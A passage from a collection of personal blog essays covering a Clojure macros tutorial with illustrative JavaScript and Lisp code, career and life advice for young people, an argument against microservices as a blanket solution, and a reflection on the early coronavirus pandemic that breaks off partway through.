From there comes the remarkable lesson about remarkable things:
***Remarkable things can't be planned.*** *If you can plan something
into the future, surely it's easy to imagine how it can be done looking
backwards.*

*So...then, how do you do remarkable things?*

**The only path is to follow your curiosity**. If you follow what you're
interested in, no matter how wacky it looks, you'll look back after some
time and say "huh", how did that happen.

I then give them an example of how it could have happened for the
climate change person: maybe they were into it, they started a blog,
they got a group together, they wrote something that got shared, and
boom, they made it to the U.N. That would have been impossible to plan.

This means ***follow your curiosity. Don't get caught up by the urge to
be #1 in some list at your school. Instead, talk with your like-minded
friends, play, and see the world unfold around you***

# Macros by Example

I was in a conversation recently about the power of macros, and the use
of syntactic abstraction in building simpler systems.

We quickly realized though: it's tough to convey in a conversation
*what's so special about macros.* What can you do with macros that you
couldn't do with functions?

In this essay, we'll use 2 examples, alongside some imaginary javascript
syntax and lisp \[1\] to explore that question!

\*\* *Note:*\*\* *This tutorial assumes you have a light understanding
of lisp syntax. Go through[this
tutorial](https://www.braveclojure.com/do-things/) to brush up if you
haven't gotten to explore lisp yet.*

\*\* *Note:*\*\* I've been meaning to write this for weeks, but was
worried that it would be confusing. I am going to apologize now if
that's how you end up feeling when you read this. There may be a better
way to explain it, but I needed to get this out of the head. If you have
any feedback on how I could make this simpler, please let me know 🙂

\[1\] The specific language is Clojure, but anything done here can be
done with any lisp

## Example 1: nullthrows

With this example, let's gain an intuition for *when* macros run and why
that can be powerful.

### Context

In any language with nulls, there's a nullthrows abstraction: If some
value evaluates to null, throw it.

Here's how we could implement that as a function in javascript:

\[code\]

    function nullthrows(result) {
      if (result === null || result === undefined) {
        throw new Error("uh oh");
      } 
      return result;
    }

\[/code\]

So if we run it, and it evaluates to null, we'll throw an exception

\[code\]

    nullthrows(getUser(db, 'billy'))
    // if it's null, throw Exception

\[/code\]

This works great...but there's a problem. *What would our stacktrace
look like?*

\[code\]

     index.html:700 Uncaught Error: uh oh
        at nullthrows (index.html:700)
        at someStuff (index.html:1325)
        ...

\[/code\]

When some value is null, the stacktrace won't have much helpful
information. It will say which line threw, but we'd have to do some
digging each time to find out where the code was.

One way we can fix that, is to pass in a message argument

\[code\]

    nullthrows(getUser(db, 'billy'), 'expected billy');

    function nullthrows(result, message) {
      if (result === null || result === undefined) {
        throw new Error(`uh oh: ${message}`);
        ...

\[/code\]

This could work...buut

### Challenge

What if I told you: **I don't want to *have* to pass in a message.**

Instead, when the *source code* that `nullthrows` wraps is specific
enough, I'd be just as happy if the error printed the offending piece of
code.

For example, with `nullthrows(getUser(db, ‘billy'))`, `nullthrows` is
wrapping the source code `getUser(db, ‘billy’))`

If the error printed out
`“Uh oh, this returned null: getUser(db, ‘billy’)”`, it would be
specific enough, and I wouldn't need a custom error message.

### Problem

Well, by the time `nullthrows` is run, `getUser(db, ‘billy’)` will be
long gone: all the function will see is the *evaluation* of
`getUser(db, ‘billy’)`. Since the evaluation will be null, there's not
much information we can gain.

### Javascript Solution

To actually *capture* and work on source code, we need a new kind of
abstraction.

This would be some kind of function, that does two things:

1.  It would take snippets of source code as input, and return new
    snippets of source code as output
2.  This abstraction would be called at the build step, and replace the
    source code snippets that it takes in, with those new source code
    snippets.

Let's say Javascript had that. instead of `function nullthrows`, we
would have `macro nullthrows`. It could look something like this:

\[code\]

    macro nullthrows(sourceCodeSnippet) {
      return `
        const result = ${sourceCodeSnippet}; 
        if (result === null || result === undefined) {
          throw new Error("Uh oh, this returned null:" + ${stringify(sourceCodeSnippet)});
        } else {
          return result;
        }
      `;
    }

\[/code\]

Here, the input would be the *actual source code.*

Whenever it's called, we would replace that piece of code, the source
code snippet that this abstraction generates.

For example, during the build step `nullthrows(getUser(db, ‘billy’))`
would be replaced with:

\[code\]

    const res = getUser(db, 'billy'); 
    if (res === null || res === undefined) {
      throw new Error("Uh oh, this failed:" + "getUser(db, 'billy')");
    } else {
      return res;
    }

\[/code\]

Now, you might see some potential problems here:

Snippets are just text! It's really had to programmatically
add/remove/edit text without causing a bunch of syntax errors. Imagine
if you wanted to change the source code, based on *what* it was --- is
it a functional call or a value? --- there would be no way to tell with
just text.

With javascript, you can work on the abstract syntax tree itself with
babel transforms, but that will make the implementation quite different
from what we want our code to be doing.

We really want to use some better data-structures to represent our code.
Turns out, this idea isn't new: there's a whole family of languages ---
the lisp family --- that wanted code to be represented with
data-structures so we could read/generate code snippets more easily.

It seems like a lot of work just to make a built-in
code-snippet-generator for a language, but let's see what our challenge
looks like if we use lisp's approach:

### Lisp solution

Since all code in lisp, are just lists, our lisp macro takes in a *list
of code,* and returns a new *list of code*

We would write nil-throws like this:

\[code\]

    (nil-throws (get-user "billy"))

\[/code\]

The function variant would look like this:

\[code\]

    (defn nil-throws [res]
      (if (nil? res)
        (throw "uh oh")
        res))

\[/code\]

Now, I'm going to show you how the macro variant would look like: (don't
worry about a few of the symbols you'll see, they're all simple and I'll
explain them in just a few words below)

\[code\]

    (defmacro nil-throws [form]
      `(let [result# ~form] ;; assign the evaluation of form to result#
        (if (nil? result#)
          (throw
            (ex-info "uh oh, we got nil!" {:form '~form})) ;; save form for inspection
          result#)))

\[/code\]

Here's how we can think about it:

1.  Similar to how we wrote \`\`\` in javascript, the backtick here does
    the same thing: it says, hey, here's the code I want to return,
    don't evaluate it right away.

2.  `#` is a handy way to generate some symbol, that won't interfere
    with any other symbol when this code gets replaced in a different
    scope.

3.  `~` is like our interpolation `${}` in javascript, but for lists

4.  `‘` is a way to say: hey, I want to treat something as a list, and
    don't want to evaluate it

This would make it so when we write:
`(nil-throws (get-user db “billy”))`

It would be replaced (\~approximately) with:

\[code\]

    (let [result# (get-user db "billy")]
      (if (nil? result#)
        (throw (ex-info "uh oh, we got nil!" {:form '(get-user db "billy")})) 
        result#))

\[/code\]

Wow...we just wrote code that wrote more code...that's pretty cool

### Lessons learned so far

Macros take *code* as input, and return *code* as output. They run
during the build step

## Example 2: pipe syntax

Now, let's explore the kind of power this can give us.

### Context

The [pipe
operator](https://docs.hhvm.com/hack/expressions-and-operators/pipe) is
quite common in a bunch of languages.

It takes code that you would normally write like this:

\[code\]

    createBill(addToCart(cart, updatePrice(item, 100)))

\[/code\]

And let's you invert the flow visually:

\[code\]

    item |> updatePrice($$, 100) |> addToCart(cart, $$) |> createBill

\[/code\]

### Challenge

What if our language didn't have this, and we wanted to implement it?
Maybe we'd want our syntax to look like this:

\[code\]

    |> [
      item, 
      updatePrice($$, 100), // updatePrice(item, 100)
      addToCart(cart, $$), // addToCart(cart, updatePrice(item, 100))
      createBill, // createbill(addToCart(cart, updatePrice(item, 100)))
    ]

\[/code\]

### Problem

Now, we could do this by implementing a pipe function:

\[code\]

    pipe(item, (item) => updatePrice(item, 100))

\[/code\]

But we would need to introduce anonymous functions, and the code would
be less concise.

*The only way to do this to spec, would be to change the syntax itself.*

### Javascript Solution

Now, with our imaginary javascript syntax, we could write something like
this:

\[code\]

    macro |> (listOfForms) {
      return listOfForms.reduce(
        (lastForm, thisForm) => {
          if (isFunctionalCall(thisForm)) {
            return `
              let $$ = ${lastForm};
              ${thisForm};
            `;
          } else {
            return `${callFunction(thisForm, lastForm)}`;
          };
      });
    }

\[/code\]

Here, would start with a list of the forms, un-evaluated:

\[code\]

    [item, updatePrice($$, 100), addToCart(cart, $$), createBill]

\[/code\]

Reduce would start with the arguments
`lastForm = item, thisForm = updatePrice($$, 100)`

Now, we would need a way to know: is this a form of a function call
`updatePrice($$, 100)`, or just a function: `createBill`

If it's a function call, we can create new code, which defines `$$` as
the last form, and evaluate the function call within that scope.

Otherwise, we can create new code, which calls that function with the
last form.

### Lisp Solution

What we want would be something like this:

\[code\]

    (|> item
        (update-price $$ 100)
        (add-to-cart cart $$)
        create-bill)

\[/code\]

And our macro could look like this:

\[code\]

    (defmacro |> [form & forms]
      (reduce
        (fn [last-v form]
          (if (seq? form) ;; am I being called: (update-price $$ 100)
            `(let [~(symbol "$$") ~last-v]
               ~form)
            `(~form ~last-v))) ;; or am I just a function: create-bill
        form
        forms))

\[/code\]

Our lisp code would follow the same idea as our Javascript solution.
Let's see the code we didn't have to write:

\[code\]

    (create-bill 
      (let [$$ (let [$$ item]
                 (update-price $$ 100))]
        (add-to-cart cart $$)))

\[/code\]

...that's pretty cool. We get the best of both worlds: efficient,
well-erroring code that's short to write and --- most importantly ---
clear to read.

### Lessons learned so far

Macros let you *change the language itself.* You can transform code and
change the syntax.

## Conclusion

Macros let you change your language to suit your problem. This is
extremely powerful: You can build up your language so you can express
your problem as clearly as possible. This makes your code more concise
and simple, which in turn makes your system more malleable.

At the same time, macros...change the language itself. There are few
moments where this level of abstraction is warranted, so if you use them
when simpler abstractions would do, you risk adding unnecessary
complexity.

Yet... when they *are* warranted, having them as an option can change
the game.

## Further Reading and Practice

If this got you interested, here's some reading and practice you may
enjoy:

-   Read Norvig's Paradgims of AI Programming, and do the homework
-   Read Clojure for The Brave and True's Macro Guide, and do the
    homework
-   Look into how Clojure uses macros to define the language itself
    (when, and, or, etc)
-   Write async await syntax for promises

## Credits

*Shoutout to Daniel Woelfel: I saw his nil-throws macro years back when
we worked together, and it opened my eyes to the power of syntactic
abstraction.*

*Thanks to Sean Grove, Daniel Woelfel, Martin Raison, Alex Reichert,
Mark Shlick for a beautifully deep review of this essay.*

*Thanks to Paul McJones, perfunctory and tzs, for their feedback on the
code examples.*

# Advice on starting out

From time to time newly graduated hackers ask me: *"Do you have any
advice for beginning my career?"*

I've found myself repeating 3 principles over and over again. On
reflection, I realized these principles apply more broadly. I *think*
they might answer the question *"Do you have any advice on for beginning
my life as an adult?"*

I thought I'd share these ideas with you here. The style and the
examples I wrote are career-oriented, but I think the core ideas will
still help in your decision making. I hope you enjoy them : ).

## Principle A: Follow your taste

*What should you do?* is one of the hardest questions to answer when you
start out.

The default path is to follow what's popular or prestigious. That can
lead to a bunch of problems: What's prestigious is already highly
competitive. When you compete with smart people in a game that has
established rules, just keeping up will take most of your time. That
leaves little time to explore what interests you. When you don't explore
what interests you, you won't understand things as deeply, and that
leaves you with an undifferentiated skillset.

**The solution here is to follow your taste.** Popularity and prestige
are lagging indicators. Your taste, especially as a young, curious
person, is a signal for *what will be* popular in the future. Regardless
though, when you follow you taste, you'll find yourself much more
interested in the problems you're solving. When you're interested in the
problems you're solving, you'll discover deeper truths, build deeper
expertise, a differentiated skillset, and have more fun along the way.

Now, you may be wondering: **What if you don't even know what you're
interested in?**

Don't worry. You just need to tune into and strengthen your taste. To do
that, just do *anything*. Once you do *anything* , ask yourself, what
part of that thing do you find interesting?

Start going deeper there, and all of a sudden, you'll discover a wealth
of interests.

Next up, you may be wondering: **What if your interests keep changing?**

Don't worry. It's totally fine. Just follow it. You'll be surprised how
things will serve you down the road. As long as you're working hard and
you're learning, it's a good use of time.

You may also wonder: **What if your interests *are* what's popular and
prestigious today?**

That's great. Follow that, but instead of competing, start sensing what
actually interests you in that field and go deeper.

The ideas may seem career oriented, so you may be wondering: **What if I
just want to travel and explore the world?**

That's great too! It's your taste, telling you that you want to travel.
Follow it and see where it leads you.

As you discover your interests, you may find that they're not
necessarily popular. Yet, when you go deeper and do your thing,
something magical will happen...which leads us into the second
principle:

## Principle B: Find your community

As you explore and follow your taste, you'll discover a subset of people
who share your core interests and values.

Nurture those relationships. Some of these people will be your friends
for life. Many of those people will become very successful in the
future.

The people you know will show you what's possible and work alongside you
in deepening, exploring, and innovating on your shared interests.

You may be wondering: *what if you live in the middle of nowhere, and
there aren't people who get you?* Do your best to go to the center of
wherever your community is. That may be SF for hackers or Los Angeles
for entertainers or Paris for artists, the list goes on. You know where
it is for you.

Now, this may sound impractical to you, but you'll be surprised with
what you can do. You can start off online in the meantime.

One common pitfall here is *focusing only on successful people in your
field.* This misses the point. Sure, reach out to those successful
people, but remember that the young, curious, interested people right
next you, *will become those successful people in the future.* You have
tons of time to spend together, so it's great way to deepen your
relationships. I'm not saying that you shouldn't reach out to successful
people (you definitely should), but to remove "success" as a criteria
altogether for choosing who you spend your time with.

Now, you may be wondering, *how do you deepen those relationships?* That
leads to us to the third principle:

## Principle C: Take risks

As you form your community, new ideas and ways to collaborate will
spring up. Take those opportunities: work together, support each-other
and play. Over time, which you have a lot of right now, you will form a
tight tribe of friends.

As a happy side effect, you'll become exposed to new fields, new
technologies, interesting problems, and interesting opportunities. Start
taking them, and you're well on your way to a career that's *made for
you.*

One common issue here is a lack of self belief. This may lead you into
choosing what you think "you are capable of", rather than what you're
interested in. One way to get around this is to just experiment: let
yourself dream and work with your friends, even if the problems seem
fantastically hard.

## Final comments

There are a lot of examples I can give you if you're interested in what
I'm interesting in: From [my favorite
books](https://m.stopa.io/my-favorite-%20books-11e6b5a3ac0a) to [Paul
Graham's essays](http://www.paulgraham.com/articles.html) to [Norvig's
Paradgims of AI
programming](https://www.amazon.com/Paradigms-Artificial-Intelligence-%20Programming-Studies/dp/1558601910),
to [Rich Hickey
talks](https://m.stopa.io/favorite-rich-hickey-talks-6bcb23da6ff2). But,
instead I encourage you to think: *what interests you right now?*

If you're up for it, I'd love to know your answer: ***what interests you
right now?*** Feel free to leave your answer in the comments or to email
me directly, I'd be curious to hear : )

## Gratitude

There's a slew of people who have influenced and mentored me. These
ideas are just as much them as me.

On the idea of taste specifically, the big shoutout has to go to Paul
Graham. A lot of my thinking about this was inspired by reading his
essays over and over when I started out. I highly suggest reading them.

*Thanks to Daniel Woelfel, Talha Baig, Martin Raison, Irakli Safareli,
David Magaltadze, Joe Averbukh, Julien Odent, for reviewing this essay*

# Crazy Ideas

*Note: This piece is specifically directed to people who work at
mid-large companies. The ideas will still apply to you if you work at
smaller companies, but they'll come as less of a surprise.*

At any point in time at a company, you can find a bunch of ideas to make
things better.

You can create features that make your customers happier. You can create
tools to make your engineers more productive. Or...you can launch
completely new products.

The questions to ask are *"Who gets these ideas"* and " *How do they get
these ideas?"*

In larger companies, there's an implicit understanding that ideas come
top- down. It's as though there's a *line* for innovation: the best
ideas come to the CEO, and maybe one day some of them trickle down to
you.

Yet, is that how things work?

Thankfully, reality doesn't work that way. If you look around you,
you'll see that some of the best ideas in the world come from some of
the most unexpected places.

For example:

Memcached --- did it come from a senior architect at google?
Nope...young kid [working on scaling their
project](https://books.google.com/books?id=2kMIqdfyT8kC&pg=PA59&lpg=PA59&dq=%22I+don%27t+think+i+did+memcached+until+like+right+after+college%22&source=bl&ots=Mm9tnfMCwG&sig=ACfU3U3byMC3wDEsQJAgfk3GXZtNMPqDKg&hl=en&sa=X&ved=2ahUKEwiq28K0lq7mAhUFEqwKHRyLDIkQ6AEwAHoECAMQAQ#v=onepage&q=%22I%20don't%20think%20i%20did%20memcached%20until%20like%20right%20after%20college%22&f=false)
(LiveJournal!).

Gmail --- did it come from an ex-hotmail VP? Nope, [24 year old who
tried creating an email client
before](https://books.google.com/books?id=ktm885vGIXEC&pg=PA161&lpg=PA161&dq=%22Was+Gmail+a+side+project+or+commissioned+by+Google?%22&source=bl&ots=vVANNhSI6h&sig=ACfU3U0Lgw8k8SL1Pcbtem_2QweDxeSgmw&hl=en&sa=X&ved=2ahUKEwjC9bKalK7mAhVEIKwKHbxpDmIQ6AEwAHoECAoQAQ#v=onepage&q=%22Was%20Gmail%20a%20side%20project%20or%20commissioned%20by%20Google%3F%22&f=false),
and decided to do that again at Google.

Airbnb --- did it come from veterans in the hospitality industry?
Nope...[just a few friends trying to make
rent](https://www.youtube.com/watch?v=KOytubycHOg).

Stripe --- did it come from veteran payments execs? Nope...[just two
brothers](https://www.youtube.com/watch?v=WfvqheCk4t8) frustrated with
taking payments online.

*This is happening all over the place externally.* And, even though it
may not seem like it, ***it's happening all over the place at larger
companies too***.

Don't believe me? Try this: look over a few of your favorite tools and
products at work. Try to find the origin story. You may be delighted
with what you find! (If you do this, I'd love to hear the origin stories
that speak to you in the comments!)

We begin to see that ideas are *not* top-down. Well, how *do ideas come
then?*

The more stories you see, the more you notice a pattern: ***Ideas come
to people who face problems, talk to customers, and tinker.*** Paul
Graham goes over this quite well in his [essay on startup
ideas](http://www.paulgraham.com/startupideas.html), and they apply at
larger companies just as well.

That's really all you need to do. The beautiful thing about this? Notice
what's missing: title, pedigree, experience. None of that is required.
Just face problems, talk to customers, and tinker.

At this point, you may be facing some resistance. You may think --- it's
just *not* how it works at my company.

Yet...I encourage you to try and test your assumptions.

Most leaders *want* people like you. They know ideas can come in the
most unexpected places. Now, there *will* be a spectrum of resistance.
At most smaller tech companies you'll find sympathy and support, while
at more bureaucratic places you'll face much more resistance.

However, If you try, you'll contribute to the culture within your
company that nurtures innovation and employee engagement. If you do
this, you'll give your company the ultimate competitive advantage and
discover a bunch of like-minded people too.

## Two action items, and a note

**1. Action Item: #crazy-ideas**

At Airbnb, we have a slack channel called #crazy-ideas. This is a space
for people to get together and spitball *any idea.* So far we've found
it great for encouraging innovation and engagement. I think Stripe has
something similar (I was inspired to create this channel from a
conversation with some of the engineers there). If you don't have this,
try starting one off at your company.

**2. Action Item: origin stories.**

In this essay I asked you to look into origin stories of some of your
favorite products. What came up? If you're up to share it, I'd love to
hear!

**3. Note: On facing resistance**

As you test your assumptions, you'll be surprised with how much you can
do, but at some point you will invariably face resistance. There's a
whole trove of strategy here: aligning with teams, finding buy-in,
managing up, building momentum, the list goes on. This will come for
another essay. Meanwhile, if you start facing these problems, ping me
and I'd happy to riff.

*Thanks to Avand Amiri, Daniel Woelfel, Eric Ning, Jacky Wang, Julien
Odent for reviewing this essay*

# The price we pay

I recently read Paul Graham's [*Raising
Kids*](http://www.paulgraham.com/kids.html) *.* I loved the piece in its
entirety, but a few sentences sparked something within me.

He wrote about what he missed about life when he was younger:

> I remember perfectly well what life was like before.
>
> Well enough to miss some things a lot,
>
> ...like the ability to take off for some other country at a moment's
> notice.

I smiled with excitement when I read that. Yes! We have *so much*
freedom.

But...there was a twist. In a few poetic sentences:

> That was so great. **Why did I never do that?**
>
> ...most of the freedom I had before kids, I never used.
>
> ...I paid for it in loneliness, but I never used it.

Yes, yes. So much yes.

We have freedom. Yet we burden ourselves with faux responsibility or
self- inflicted urgency.

Think about it: what feelings come to you, when you imagine doing
something *for no reason at all?*

It can feel *wrong* on so many levels. Yet, where where are we hurrying
too?

The time when we have real responsibility will come.

The time where we *absolutely* *must* focus on one thing, in one place,
will come.

We're already paying for the freedom we have. How can we embrace it?

# School, Nietzsche, and Comfort for High School Kids

I have four fierce and independent nephews. Three of them are over 13,
which means they're now "serious" about academics. They also have
equally fierce moms with high expectations, and that means report card
season can get tough.

To help them get through the ordeal, I repeat a few ideas over and over.
I realized these ideas apply to all ages, so I thought I\'d share them
with you.

Here's what I tell them:

**Your goal is curiosity**

I don't think grades are important.

*(This gives them a bit of a shock, and their mom raises an eyebrow, but
I forge on)*

You can do so much more than what's expected of you. *Just* getting good
grades won't have you feeling like you're becoming the person you want
to be.

I want you to make great friends and explore. Create games, music,
launch businesses, play, investigate, talk to that girl, do whatever
drives you. Those experiences forge your character and teach you in
uncountable ways

*Adult Aside ---* *Think about how much of your time is spent on status
games. The most leveraged, creative work comes when you're* [*following
your taste*](https://www.stopa.io/post/230) *. Are your goals just about
the status game, or something bigger?*

**But grades are your day job**

You still want to get good grades though. This keeps your options open,
gives you chances to learn new things, and keeps people from asking too
many questions.

At this point, they invariably say: *But...some courses I'm just not
interested in --- when will X be useful, etc*

Treat this as your day job and a challenge. What's the minimum time you
need to spend to get the grade you want on those courses?

If you focus on the challenge, a lot of your time will be spent figuring
out creative solutions and productivity hacks. This itself will be more
fun than the course, help you build discipline, and learn techniques
that will be useful to you throughout life. Remember, you just want to
do a good job so you can be that inventor, renaissance explorer, hacker,
or artist that you want to be.

*Adult Aside ---* *Before google came around, search was boring: a
"simple" technical problem that no one wanted to solve anymore. Google
turned it into a very interesting problem. Think about how you could do
that to some of your grudging must-do tasks. At the very least it will
strengthen your discipline*

**Be wary of slave morality**

They may interject with a platitude: W *hat's important is to be a good
person, I don't kiss up to the teacher, who cares about grades.*

Have you heard of Nietzche's slave morality? Be wary of combining bad
characteristics with good ones. You can get good grades *and* be a good
person.

Learn to catch yourself doing this, because it will happen all the time
in your life. Now it's grades, but tomorrow it may be "Rich people are
evil, I'm not evil".

You may feel good about yourself, but if you follow this idea, you won't
get what you want. Instead, ask the question: "How can I get good grades
and \*not kiss up?" Find people like that and learn from them.

*Adult Aside ---* *Anytime you want something that you don't have, this
thinking will materialize. "Oh people who are fit spend so much time in
the gym, I'm not that kind of person", etc etc. Be careful about the
constraints you set with your ideas.*

**Be wary of all or nothing thinking**

Slave morality can get hard to swallow, so they may say --- *but grades
are unfair. Even if I do well the teacher can knock me for
"participation", that's why the kiss-up people get good grades.*

You're right. This is frustrating and unfair. And there's a reason some
people kiss up: it's easier to do that. But, just because some parts are
unfair and some people cheat, doesn't mean you should give up on what
you want. The world isn't so black and white.

*Tell yourself: you will do what's under your control.* Learn from the
people you admire who behave the way you think is right. Yes some people
have an advantage, yes some things are plain unfair, but you can still
get what you want. If you do all of that and it doesn\'t work, you\'ll
know you tried your best, and something better will certainly happen
regardless.

*Adult Aside ---* *I remember Ramit Sethi telling the story of someone
who wanted to start working out, but only had one day free a week.
Instead of working out once a week, they didn't work out at all. They
thought it had to be 5 times a week. The more you can let go of the
black and white nature of childhood, the more you'll flourish*

**Be wary of comfort**

A final interjection may come from comfort --- *I want to learn this
thing, but I don't want to look dumb, etc.*

If you lived in our village, you'd be *prettyy cool.* Wow you study in
the big city, wow, you know so much math, wow you are good at fighting.

But imagine if you met a navy seal from Afghanistan. How do you think
your fighting skill would stack up?

If you *actually* want to become great, you have to get outside of your
comfort zone *.* Actively look for those opportunities. You'll have an
urge to drop them because you want to feel cool...but hey it's better to
*be* cool then to *feel* cool

*Adult Aside ---* *Ask yourself constantly, where are the people I can
learn from? It can be uncomfortable to go from the best person in the
room to a[noob](http://paulgraham.com/noob.html), but this is the path
forward*

**Appreciations**

Many of these ideas crystallized by reading two people have inspired me:
Nassim Taleb and Paul Graham. Nassim for elucidating the life of the
flaneur, and Paul for his essay ["What you'd wish you'd
known"](http://www.paulgraham.com/hs.html)

*Thanks to Nino Parunashvili, Elene Asanidze, Alex Reichert, Julien
Odent for reviewing drafts of this essay*

# Blanket Solutions and Microservices

Much of my system design philosophy was forged during my time at
Facebook. We did a lot of things differently that I think was
responsible for our technical success. I want to share one of them with
you. It's the most common pitfall I\'ve see prevalent in our industry,
and it relates how we solve problems at the system level. I'll
illustrate it with a story:

### Beginning

You kick off your startup. One service, one repo, one database. Version
zero ships quickly. You iterate and iterate until you sense product
market fit.

All of a sudden, you've got it and you're on a rocket ship. You grow
your team, you're onboarding customers, and you've got some great
problems on your hands.

### Emergency

One of those problems: your systems break.

Your build infrastructure slows down. Deployment becomes an all-day,
panic- ridden affair. Commits start to break unrelated components more
and more frequently. The development environment becomes slower and
slower. You get incidents left and right. Oncall becomes more demanding
than a newborn at night.

Slow down productivity and you'll get grumpy engineers, but take away
their sleep and you'll get rioting engineers. Now you have an emergency
on your hands.

### Light in the Darkness

You look around, and the technical debt is overwhelming. You think: it's
time to grow up. You research and land on microservices as the answer.
It seems to solve all your biggest pain points:

\*\* *Speed up deployments*\*\*

Teams can manage their own deployments. Because deploying smaller
systems is easier and safer than larger ones, your teams can now deploy
faster. Heck, they could even roll back now.

\*\* *Separate concerns*\*\*

You'll force stronger code boundaries. No more commits breaking
unrelated components

\*\* *Empower teams*\*\*

You'll be able to use the right tools for the job. No more need to have
the same language or stack. Teams can use whatever will make the most
productive at solving their particular problem.

\*\* *Ensure quality*\*\*

You'll be able to clarify ownership. No more spaghetti code because
service owners will ultimately be responsible

### Uh Oh

This is the dream. You kick off that initiative. But...you see some
serious costs:

\*\* *Hardened boundaries are harder to change*\*\*

Those strict code boundaries come with their own costs. If you split
incorrectly, you're prone to dupe your data and your logic. But, even if
you split correctly, what happens when your business needs change? What
if you get new regulation that requires system-wide changes? All of a
sudden, the way you split those services won't make sense anymore, and
evolving those boundaries become a magnitude more difficult.

\*\* *Hardened boundaries make it more difficult to ship unanticipated
changesets*\*\*

What if you need to make changes that your org and service structure
didn't anticipate? These changes won't cleanly fit into one service, or
even groups of services. All of a sudden a change that could have been
done by one engineer before requires teams to align to deliver.

***Hardened boundaries reduce the potential impact of your engineers***

What if one of your engineers comes up with a performance improvement,
or a new idea for the business? Their impact is now constrained by the
services they have control over. If the languages are different they
won't be able to actualize that performance improvement for the whole
company. Even if we force all services to use the same language,
delivering that to all services becomes a difficult affair.

\*\* *More Incidental complexity*\*\*

Sharing code, managing deploys, logging infrastructure, service
orchestration, rpc are all made more difficult by a change to multiple
services. None of the added difficulty helps you move faster or ship
with higher quality.

### Root Cause

Why so many unanticipated issues? Because microservices as a strategy is
a **blanket solution.**

Blanket solutions don't *specifically* address any one issue, but try to
address a multitude of issues. This is often done with philosophy (new
principles we will follow to build things) then with technology (how
exactly we will solve problems). Whenever a solution addresses a
multitude of issues with philosophy, it's likely to come with a
multitude of unanticipated problems.

### An Alternative Path

The alternative path is evolution. As a rule of thumb, the changes you
introduce should concretely solve the problems you care about. This
doesn't mean that all solutions need to be iterative, but it does mean
that all solutions need to be under strong selection pressure. Every
solution should have immediate wins in sight.

For example:

***Deployment, CI, logging issues?***

*What if you built a centralized team that owned that complexity, and
built infrastructure so product engineers didn't have to worry about it?
For example, most product engineers did not have to worry about deploys,
observability, or logging at Facebook. Infra was already in place that
they could leverage, managed by an underlying team.*

\*\* *Code boundary issues?*\*\*

*What if you evolved your system to use* *immutable structures* *and*
\_smaller interfaces between boundaries\*\*? What if you pushed some of
these problems down the stack? For example, there may be a lot of
complexity introduced with privacy. You can centralize that concern,
into building infrastructure with a small interface, that product
engineers can use. Facebook did this with viewer context\_

\*\* *Scaling issues?*\*\*

*This may be a true concern, but instead of applying a general
philosophy, could we focus on solving this problem directly? Do all
systems need to scale independently, or does it only matter that just a
few things scale independently? exactly are the problems? Could you
address with* *only changing the hottest, most intensive paths?*

\*\* *Complexity issues?*\*\*

*Where is the complexity exactly? Could we evolve modules so you could
localize the reasoning behind them? Could we abstract the difficult
portions? Sophie Alpert gives a great example of this*
[*here*](https://sophiebits.com/2020/01/01/fast-maintainable-db-patterns.html)

This kind of thinking leads to a philosophy of system design based on
simplicity:

*You address problems concretely with a view towards evolving your
system.* At each step of the way, you constantly optimize for
engineering velocity. Engineering velocity is a great metric to use,
because it implies correctness and quality alongside with speed. It's
impossible to ship if you don't have confidence in your system. You push
and centralize complexity down the stack. You evolve your system so
product engineers can think locally within the module they're working
on. You make changes that empower any engineer to drive impact
throughout the stack.

Doing this won't be a magic pill --- it will look like your system is
constantly broken and in need of improvement --- but that is its secret
weapon. You're constantly evolving it.

*Thanks to Daniel Woelfel, Jacky Wang, Kam Leung, Joe Averbukh, Phil
Nachum, Alexandre Lebrun, for reviewing drafts of this essay*

# On the Coronavirus

The last few weeks has been tough for all of us. I wanted to share with
you my personal experience, and the mindset I'm relying on to move
forward.

## Looking Back

### The calm before the storm

I remember first hearing about this in mid January. My friend was about
to head out to China, and she was worried about it. She tends to
over-worry, so I reassured her and jokingly told her how she would be
fine.

One week in, my coworker visited from China. From his eyes and his
stories I could tell this was serious. I called my friend and found out
she came back early. Since I was 18, I constantly thought about
exponential growth, tail risks, and black swans (1). This fit the bill
--- I understood it conceptually. But it stopped there. Conceptually.

From February to mid March, I was going through the *motions* of
preparation. Though I thought I understood that the world could shift in
a few days, my understanding was only hypothetical. In early February I
told my parents to buy up food, and ordered food in San Francisco as
well. In some respects I was preparing, but in another, I was simply
fitting preparation to the amount of time I had. I didn't think it was
important enough to change priorities.

As things escalated, I increased my attention, but never to the level
that this deserved. I canceled my plan to go to New York and tried to
distance more. Again this was going through the motions --- even with
all this happening, the most important thing on my mind was my existing
work and personal projects. Even when we were told to work from home.
Even as I saw the markets begin to crash, and a significant portion of
my personal wealth disappear with them.

### The storm

Towards the end of the week, it began to hit me. I realized that we were
in much worse shape than China. Complete social isolation was on the
way. We could enter a serious recession.

In the same day, two of my friends and I decided to move to a cabin and
isolate there. We thought we'd go for a month, starting Wednesday. By
the evening we decided to go for two months, the very next day. The
timing was on the nose, as the very next day shelter in place was
announced in San Francisco.

The next 48 hours was a blur. We got everything together, I ended up
liquidating my entire portfolio, and we got out of San Francisco. I
remember feeling like I was in a war zone --- making multiple drastic,
high impact decisions a day. After a night of being stranded, we arrived
safe and sound in the cabin. After those 48 hours, my eyes cleared up.

## Looking Ahead

As we move towards the present, there's uncertainty all around us. Many
of us are worried about our loved ones. We're worried about the future.
Will hospitals flood with patients and will military cars carry coffins?
How long will this last? In a matter of days, many have lost their jobs
and many have lost significant wealth. Are we about to experience the
great depression?

That's a lot of uncertainty, but we can come together and manage it.
Here's how I'm thinking about it:

### Short Term

1.  **Amor Fati (2)**

Character is forged through adversity and judged by action rather than
thought. Will you let the panic consume you or will you strengthen your
resolve? Will you focus inward or will you focus outward? Many of us
have felt fear and when we feel fear, the reaction is knee-jerk. As you
act, keep this top of mind: how you behave now, no matter what you think
inside, is what determines your character.

Let this idea guide you gently: you can feel fear of course, and you can
make mistakes, but keeping the idea top of mind will gently evolve and
shape your behavior.

1.  **Come together**

Some have experienced a significant loss of wealth, yet still won't have
to worry about their livelihood. Others have lost their jobs. Some have
families that are in trouble. We have experienced pain, we are all in
different circumstances, and we all have some ways that we can support
our community.

We can't fix this overnight. No big brother can make sweeping changes.
Let's do what we can as individuals, whether that's financial support, a
phone call, or a kind word\--it all counts. Use this adversity to come
together.

1.  **Roll with the punches**

When there's volatility and change, the panic and fear can make it hard
to adjust. Yet, we must adjust. If you're in quarantine --- what can you
do *because* of it? How can you grow and how can you be helpful?
Adjusting will calm you and give you mental clarity: whether that's
adjusting what you do at work, reading new books, or finding new ways to
connect --- make the change.

